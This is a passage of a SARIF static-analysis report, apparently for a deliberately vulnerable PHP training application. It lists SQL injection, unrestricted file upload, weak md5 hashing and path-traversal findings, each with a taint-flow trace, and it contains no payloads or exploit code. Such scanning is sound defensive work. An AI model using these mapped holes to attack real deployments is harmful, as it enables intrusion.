                "region" : {
                  "startLine" : 48
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:48 - rand()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/high.php"
                },
                "region" : {
                  "startLine" : 48
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4493",
      "message" : {
        "text" : "Line 12 of low.php invokes a SQL query built with input that comes from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "5A0F32B85F1CC235D243B03CC86A1A9E"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/sqli_blind/source/low.php"
          },
          "region" : {
            "startLine" : 12,
            "endLine" : 12,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:12 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/low.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:11 - Assignment to $query"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:12 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/low.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4459",
      "message" : {
        "text" : "Line 14 of medium.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "3F5E7A9E44323081569A476563B14944"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/sqli_blind/source/medium.php"
          },
          "region" : {
            "startLine" : 14,
            "endLine" : 14,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_POST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_POST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:10 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/medium.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:10 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/medium.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:13 - Assignment to $query"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/medium.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli_blind/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4639",
      "message" : {
        "text" : " Permitting users to upload files can allow attackers to inject dangerous content or malicious code to run on the server.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "B3DD23E68E7EF0BC0BE3FF87C6D610EA"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/upload/source/high.php"
          },
          "region" : {
            "startLine" : 20,
            "endLine" : 20,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:20 - move_uploaded_file()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:20 - move_uploaded_file()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4630",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "AC42756FD138BF3FC69DFEDBB0598643"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/upload/source/impossible.php"
          },
          "region" : {
            "startLine" : 18,
            "endLine" : 18,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:18 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:18 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4629",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "AC42756FD138BF3FC69DFEDBB0598642"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/upload/source/impossible.php"
          },
          "region" : {
            "startLine" : 20,
            "endLine" : 20,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:20 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:20 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4372",
      "message" : {
        "text" : "Attackers can control the file system path argument to rename() at impossible.php line 40, which allows them to access or modify otherwise protected files.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "0731B425E8C0D3DC0A2263653226A9AC"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/upload/source/impossible.php"
          },
          "region" : {
            "startLine" : 40,
            "endLine" : 40,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_FILES['uploaded']['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:40 - rename(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 40
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_FILES['uploaded']['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $uploaded_name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - substr(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - Assignment to $uploaded_ext"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:18 - Assignment to $target_file"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:40 - rename(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 40
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4652",
      "message" : {
        "text" : "Attackers can control the file system path argument to rename() at impossible.php line 40, which allows them to access or modify otherwise protected files.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "BDDC541747785C8EA40709797A54AF86"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/upload/source/impossible.php"
          },
          "region" : {
            "startLine" : 40,
            "endLine" : 40,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_FILES['uploaded']['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:40 - rename(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 40
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_FILES['uploaded']['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $uploaded_name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - substr(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - Assignment to $uploaded_ext"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:20 - Assignment to $temp_file"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:40 - rename(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 40
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4369",
      "message" : {
        "text" : "Attackers can control the file system path argument to unlink() at impossible.php line 51, which allows them to access or modify otherwise protected files.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "048F228A2A33AB037DB11957FC3F418C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/upload/source/impossible.php"
          },
          "region" : {
            "startLine" : 51,
            "endLine" : 51,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_FILES['uploaded']['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:51 - unlink(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_FILES['uploaded']['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $uploaded_name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - substr(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - Assignment to $uploaded_ext"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:20 - Assignment to $temp_file"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:51 - unlink(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4432",
      "message" : {
        "text" : " Permitting users to upload files can allow attackers to inject dangerous content or malicious code to run on the server.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "2D516C706B5D3F7213ADC9DB002BB110"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/upload/source/low.php"
          },
          "region" : {
            "startLine" : 9,
            "endLine" : 9,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:9 - move_uploaded_file()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:9 - move_uploaded_file()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/low.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4382",
      "message" : {
        "text" : " Permitting users to upload files can allow attackers to inject dangerous content or malicious code to run on the server.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "0CF64F962465CA5B66C7BCFC9FBA6CB5"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/upload/source/medium.php"
          },
          "region" : {
            "startLine" : 18,
            "endLine" : 18,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:18 - move_uploaded_file()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/medium.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:18 - move_uploaded_file()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/medium.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4503",
      "message" : {
        "text" : "Attackers can control the file system path argument to file_get_contents() at view_help.php line 20, which allows them to access or modify otherwise protected files.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "5BB70EA8787D13F2DFC5D032E6FF61C3"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/view_help.php"
          },
          "region" : {
            "startLine" : 20,
            "endLine" : 20,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_help.php:14 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_help.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_help.php:20 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_help.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_help.php:14 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_help.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_help.php:14 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_help.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_help.php:20 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_help.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4492",
      "message" : {
        "text" : "Attackers can control the file system path argument to file_get_contents() at view_help.php line 22, which allows them to access or modify otherwise protected files.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "5831F5CE959A695B3B3AF41986A35C75"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/view_help.php"
          },
          "region" : {
            "startLine" : 22,
            "endLine" : 22,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_help.php:14 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_help.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_help.php:22 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_help.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_help.php:14 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_help.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_help.php:14 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_help.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_help.php:22 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_help.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4622",
      "message" : {
        "text" : "Attackers can control the file system path argument to file_get_contents() at view_help.php line 22, which allows them to access or modify otherwise protected files.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "A2147A1BF6F92068625904D99D511436"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/view_help.php"
          },
          "region" : {
            "startLine" : 22,
            "endLine" : 22,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_help.php:16 - Read $_GET['locale']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_help.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_help.php:22 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_help.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_help.php:16 - Read $_GET['locale']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_help.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_help.php:16 - Assignment to $locale"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_help.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_help.php:22 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_help.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4471",
      "message" : {
        "text" : "Attackers can control the file system path argument to file_get_contents() at view_source.php line 54, which allows them to access or modify otherwise protected files.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "4504F0E50B1163726D5BBE51EC241D86"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/view_source.php"
          },
          "region" : {
            "startLine" : 54,
            "endLine" : 54,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_source.php:12 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:54 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 54
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:12 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:12 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:54 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 54
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4481",
      "message" : {
        "text" : "Attackers can control the file system path argument to file_get_contents() at view_source.php line 54, which allows them to access or modify otherwise protected files.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "521A8A7C37654535622DA057BE82AADC"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/view_source.php"
          },
          "region" : {
            "startLine" : 54,
            "endLine" : 54,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_source.php:13 - Read $_GET['security']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:54 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 54
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:13 - Read $_GET['security']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:13 - Assignment to $security"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:54 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 54
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4428",
      "message" : {
        "text" : "Attackers can control the file system path argument to file_get_contents() at view_source.php line 59, which allows them to access or modify otherwise protected files.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "297088179E41B83F29C1216067B26FFC"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/view_source.php"
          },
          "region" : {
            "startLine" : 59,
            "endLine" : 59,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_source.php:12 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:59 - file_get_contents(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 59
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:12 - Read $_GET['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 12
                }
